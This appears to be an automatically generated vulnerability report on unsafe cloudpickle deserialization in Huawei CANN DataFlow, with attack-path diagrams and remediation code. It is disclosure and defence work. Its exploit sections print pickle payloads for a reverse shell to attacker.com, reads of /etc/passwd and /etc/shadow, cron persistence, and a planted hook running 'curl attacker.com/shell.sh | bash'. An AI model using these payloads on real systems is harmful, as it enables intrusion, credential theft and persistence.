# Vulnerability Report: dflow-pickle-deser-001

## Summary

| Attribute | Value |
|-----------|-------|
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **Severity** | HIGH/CRITICAL |
| **Type** | Insecure Deserialization |
| **Affected File** | `dflow/pydflow/python/dataflow/utils/msg_type_register.py:81-84` |
| **Function** | `_deserialize_with_cloudpickle` |
| **Vulnerable Code** | `cloudpickle.loads(buffer)` |

## Vulnerability Description

The `MsgTypeRegister` class in Huawei's CANN (Compute Architecture for Neural Networks) DataFlow framework uses `cloudpickle.loads()` to deserialize Python objects without any validation, signature verification, or type restrictions. This creates a classic insecure deserialization vulnerability that can lead to arbitrary code execution.

### Vulnerable Code

```python
# File: msg_type_register.py, lines 81-84
def _deserialize_with_cloudpickle(self, buffer):
    import cloudpickle
    return cloudpickle.loads(buffer)  # VULNERABLE: No validation
```

### Registration at Initialization

```python
# File: msg_type_register.py, lines 19-22
self._registered_msg = {65535: "__PickledMsg__"}
self._registered_clz_to_msg_type = {"__PickledMsg__": 65535}
self._serialize_func = {65535: self._serialize_with_cloudpickle}
self._deserialize_func = {65535: self._deserialize_with_cloudpickle}
```

The deserializer is registered for message type **65535** (`MSG_TYPE_PICKLED_MSG`), which is the default pickle message type used throughout the DataFlow framework.

## Attack Path Analysis

### Attack Vector 1: Network-Based Message Injection

The primary attack path involves malicious `FlowMsg` objects received over the network:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          ATTACK PATH: NETWORK                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. External Input                                                           │
│     └────────────────────────────────────────────────────┐                  │
│                                                          ▼                  │
│  2. FeedDataFlowGraph / FeedFlowMsg                                            │
│     [dflow_api.cc:273, dflow_session_impl.cc:381]                            │
│     Receives FlowMsgPtr containing malicious pickle payload                  │
│                                                          ▼                  │
│  3. FlowFuncProcessor::Proc                                                   │
│     [flow_func_processor.cpp:405-414]                                        │
│     Creates MbufFlowMsg from received mbuf data                              │
│                                                          ▼                  │
│  4. Python Wrapper Conversion                                                 │
│     [pyflow.py:349]                                                          │
│     utils.convert_flow_msg_to_object(ff.FlowMsg(input))                     │
│                                                          ▼                  │
│  5. Deserialization Trigger                                                   │
│     [utils.py:187-191]                                                       │
│     deserialize_func = get_msg_type_register().get_deserialize_func(        │
│         flow_msg.get_msg_type()  # Returns 65535 for pickle messages        │
│     )                                                                         │
│     obj = deserialize_func(flow_msg.get_raw_data())                         │
│                                                          ▼                  │
│  6. ARBITRARY CODE EXECUTION                                                  │
│     [msg_type_register.py:84]                                                │
│     cloudpickle.loads(malicious_buffer)  <-- RCE HERE                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Key Entry Points:**
- `dataflow.py:1341`: `session.feed_flow_msg(self._graph_id, indexes, inputs, timeout)`
- `dataflow.py:1382`: `output_object = self._convert_flow_msg_to_object(output)`
- `utils.py:191`: `obj = deserialize_func(flow_msg.get_raw_data())`

### Attack Vector 2: File-Based Pickle Loading

Secondary attack path via pickle files loaded from workspace directories:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          ATTACK PATH: FILE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. Malicious .pkl Files Placed in WorkPath                                  │
│     - {work_path}/_msg_type_register.pkl                                     │
│     - {work_path}/_env_hook_func.pkl                                         │
│     - {work_path}/{py_clz_name}.pkl                                          │
│                                                          ▼                  │
│  2. tpl_wrapper_code.cpp Initialization                                      │
│     [tpl_wrapper_code.py:253-286]                                            │
│     GetFileBuffer reads .pkl files from params->GetWorkPath()               │
│                                                          ▼                  │
│  3. Direct Deserialization                                                   │
│     [tpl_wrapper_code.py:260-265]                                            │
│     deserialize_func = type_register.attr("get_deserialize_func")(65535)    │
│     type_register = deserialize_func(py::memoryview::from_memory(           │
│         &reg_buf[0], reg_buf.size(), false))  <-- RCE                       │
│                                                          ▼                  │
│  4. Hook Function Execution                                                   │
│     [tpl_wrapper_code.py:276]                                                │
│     deserialize_func(hook_buffer)()  <-- Immediate execution                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Critical File Locations:**
- `{work_path}/_msg_type_register.pkl` - Loaded at line 253-267
- `{work_path}/_env_hook_func.pkl` - Loaded and EXECUTED at line 269-276
- `{work_path}/{py_clz_name}.pkl` - Loaded at line 279-286

## Exploit Demonstration

### Malicious Pickle Payload Construction

```python
import cloudpickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # Arbitrary command execution
        return (os.system, ('id > /tmp/pwned.txt && cat /etc/passwd',))

# Serialize the payload
payload = cloudpickle.dumps(MaliciousPayload())

# This payload, when deserialized via cloudpickle.loads(payload),
# will execute: os.system('id > /tmp/pwned.txt && cat /etc/passwd')
```

### More Dangerous Payload Examples

```python
# Reverse shell
import socket, subprocess, os
class ReverseShell:
    def __reduce__(self):
        return (subprocess.Popen, (
            ['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
            {'shell': True, 'stdout': subprocess.PIPE}
        ))

# File read exfiltration
class Exfiltrate:
    def __reduce__(self):
        return (subprocess.check_output, ('cat /etc/shadow', {'shell': True}))

# Persistence mechanism
class Persistence:
    def __reduce__(self):
        return (os.system, (
            'echo "* * * * * /tmp/malware.sh" | crontab -'
        ))
```

## Impact Assessment

### Severity: CRITICAL

**Impact Categories:**

| Impact | Description |
|--------|-------------|
| **Arbitrary Code Execution** | Full control over the Python process executing the deserialization |
| **Data Exfiltration** | Access to all data the process can read |
| **Privilege Escalation** | Execution with whatever privileges the dflow process has |
| **System Compromise** | Potential pivot to other systems via reverse shells or implants |
| **Supply Chain Attack** | Corrupted pickle files in shared workspaces affect all users |

### Affected Components

1. **DataFlow Graph Execution**: All graph processing that receives pickle messages
2. **LLM Data Distribution**: `llm_flow_service.cc` uses `FeedDataFlowGraph`
3. **User-Defined Functions**: Python UDFs loaded from workspace directories
4. **Multi-Node Deployments**: Network messages between distributed nodes

### Attack Scenarios

1. **Malicious Participant**: In a multi-node cluster, a compromised node can send malicious pickle messages to other nodes
2. **Workspace Poisoning**: Attacker with write access to `work_path` can plant malicious .pkl files
3. **Man-in-the-Middle**: If network traffic is unencrypted, pickle payloads can be modified in transit
4. **Model/Code Sharing**: Shared pickle files (e.g., model weights serialized with cloudpickle) can contain hidden payloads

## Root Cause Analysis

The vulnerability stems from:

1. **No Validation**: `cloudpickle.loads()` is called directly on received data without any checks
2. **No Signing**: No cryptographic signature verification to authenticate pickle sources
3. **No Type Filtering**: No restriction on what Python types can be deserialized
4. **Default Registration**: Message type 65535 is registered by default, making it always available
5. **Trusted Channel Assumption**: Code assumes messages/files come from trusted sources only

## Proof of Concept

### Network-Based Attack Simulation

```python
# Attacker code to craft malicious FlowMsg
import dataflow as df
import cloudpickle
import os

# Initialize dataflow
df.init({"ge_initialize_type": "3"})

# Create malicious payload
class RCEPayload:
    def __reduce__(self):
        return (os.system, ('whoami',))

# Create a FlowData and set malicious pickle data
graph = df.Graph()
input_data = df.FlowData(name="malicious_input")

# This would normally be set via feed_dict, but the key point is:
# If we can control the raw_data bytes in a FlowMsg with msg_type=65535,
# cloudpickle.loads() will execute arbitrary code.

# Payload bytes
payload_bytes = cloudpickle.dumps(RCEPayload())

# If attacker controls network message content with msg_type=65535:
# The deserialization at utils.py:191 will execute the payload
```

### File-Based Attack Simulation

```bash
# Attacker with write access to work_path
WORK_PATH="/path/to/workspace/src_python"

# Create malicious _env_hook_func.pkl (gets executed immediately)
python3 << 'PYEOF'
import cloudpickle
import os

class HookPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

with open(f"{WORK_PATH}/_env_hook_func.pkl", "wb") as f:
    f.write(cloudpickle.dumps(HookPayload()))
PYEOF

# When tpl_wrapper_code.cpp runs, line 276 will execute:
# deserialize_func(hook_buffer)()
# Result: curl attacker.com/shell.sh | bash is executed
```

## Remediation Recommendations

### Immediate Mitigations

1. **Disable Pickle Deserialization** (if not required):
```python
# Remove default registration
self._deserialize_func = {}  # Don't register cloudpickle by default
```

2. **Add Validation Layer**:
```python
def _deserialize_with_cloudpickle(self, buffer):
    import cloudpickle
    
    # Option A: Use safe unpickle (requires custom implementation)
    # Option B: Add signature verification
    if not self._verify_signature(buffer):
        raise SecurityError("Invalid pickle signature")
    
    return cloudpickle.loads(buffer)
```

3. **Restrict Deserialization Sources**:
```python
def get_deserialize_func(self, msg_type):
    # Only allow deserialization from trusted message types
    if msg_type == 65535 and not self._is_trusted_source():
        return None
    return self._deserialize_func.get(msg_type, None)
```

### Long-Term Fixes

1. **Use Safe Serialization Format**:
   - Replace cloudpickle with JSON/MessagePack for data interchange
   - Use `dill` with restricted globals if pickle is required
   - Implement a custom safe deserializer

2. **Implement Signature Verification**:
```python
import hashlib
import hmac

class SecurePickleDeserializer:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def deserialize(self, signed_buffer):
        # Extract signature and payload
        signature = signed_buffer[:32]
        payload = signed_buffer[32:]
        
        # Verify HMAC
        expected_sig = hmac.new(self.secret_key, payload, hashlib.sha256).digest()
        if not hmac.compare_digest(signature, expected_sig):
            raise SecurityError("Invalid signature")
        
        return cloudpickle.loads(payload)
```

3. **Whitelist Allowed Classes**:
```python
# Use RestrictedUnpickler pattern
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        'numpy.ndarray',
        'numpy.dtype',
        # Add specific allowed classes
    }
    
    def find_class(self, module, name):
        full_name = f"{module}.{name}"
        if full_name not in self.ALLOWED_CLASSES:
            raise SecurityError(f"Class {full_name} not allowed")
        return super().find_class(module, name)
```

4. **Input Validation at Network Layer**:
   - Validate message type ranges at `FeedDataFlowGraph` entry point
   - Add message size limits
   - Implement rate limiting for pickle messages

5. **Audit and Logging**:
```python
def _deserialize_with_cloudpickle(self, buffer):
    import cloudpickle
    import logging
    
    # Log all deserialization attempts
    logging.warning(f"Deserializing {len(buffer)} bytes with cloudpickle")
    logging.debug(f"Buffer hash: {hashlib.sha256(buffer).hexdigest()}")
    
    try:
        obj = cloudpickle.loads(buffer)
        logging.info(f"Deserialized object type: {type(obj).__name__}")
        return obj
    except Exception as e:
        logging.error(f"Deserialization failed: {e}")
        raise
```

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization)
- [Python pickle Security Considerations](https://docs.python.org/3/library/pickle.html#security-considerations)
- [cloudpickle Documentation](https://github.com/cloudpipe/cloudpickle)

## Conclusion

This is a **confirmed, exploitable vulnerability** of CRITICAL severity. The `cloudpickle.loads()` call on untrusted data allows arbitrary code execution with the privileges of the DataFlow process. The vulnerability exists in the default configuration with message type 65535 registered automatically.

**Recommended Action**: Immediately implement signature verification or migrate to a safe serialization format. Until fixed, restrict network access to DataFlow endpoints and audit all .pkl files in workspace directories.

---
*Report generated by vulnerability scanner*
*CWE-502: Insecure Deserialization*
